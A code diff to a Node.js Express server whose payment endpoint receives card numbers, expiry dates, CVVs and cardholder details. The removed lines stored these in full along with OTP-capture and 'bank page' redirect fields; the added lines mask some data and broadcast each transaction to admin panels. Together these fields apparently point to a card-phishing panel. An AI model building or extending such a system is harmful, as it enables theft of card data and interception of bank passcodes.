@@ -5,9 +5,10 @@ import crypto from 'crypto';
 import http from 'http';
 import { Server } from 'socket.io';
 
+const cors = require('cors');  // Add this line
 const app = express();
-app.use(bodyParser.json());
 app.use(cors());
+app.use(bodyParser.json());
 app.use(express.static(".")); // Serves static files from the current directory
 
 const server = http.createServer(app);
@@ -82,30 +83,52 @@ app.get('/api/transactions', (req, res) => {
 // ------------------------------
 // Process Payment Details Endpoint
 // ------------------------------
+// Replace the ENTIRE existing /api/sendPaymentDetails endpoint with:
 app.post('/api/sendPaymentDetails', (req, res) => {
-  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-  const transaction = {
-    id: invoiceId,
-    cardNumber,
-    expiry,
-    cvv,
-    email,
-    amount: amount.toString().replace(/,/g, ''),
-    currency,
-    cardholder,
-    status: 'processing',
-    otp: null,
-    otpShown: false,
-    otpEntered: null,
-    otpError: false,
-    redirectStatus: null,
-    bankpageVisible: false,
-    timestamp: new Date().toLocaleString()
-  };
-  transactions.set(invoiceId, transaction);
-  console.log("New transaction recorded:", transaction);
-  res.json({ status: "success", invoiceId });
+  try {
+    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+    
+    // Validate required fields
+    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
+      return res.status(400).json({ 
+        status: "error", 
+        message: "All fields are required" 
+      });
+    }
+
+    const invoiceId = require('crypto').randomBytes(4).toString('hex').toUpperCase();
+    
+    const transaction = {
+      id: invoiceId,
+      cardNumber: cardNumber.slice(-4), // Store only last 4 digits
+      expiry,
+      cvv: '***', // Never store real CVV
+      email,
+      amount: parseFloat(amount).toFixed(2),
+      currency,
+      cardholder,
+      status: 'processing',
+      timestamp: new Date().toLocaleString(),
+      bankpageVisible: false
+    };
+
+    transactions.set(invoiceId, transaction);
+    
+    // Notify all admin panels
+    io.emit('new_transaction', transaction);
+    
+    res.json({ 
+      status: "success", 
+      invoiceId: invoiceId 
+    });
+
+  } catch (error) {
+    console.error('Payment Error:', error);
+    res.status(500).json({
+      status: "error",
+      message: "Internal server error"
+    });
+  }
 });
 
 // ------------------------------
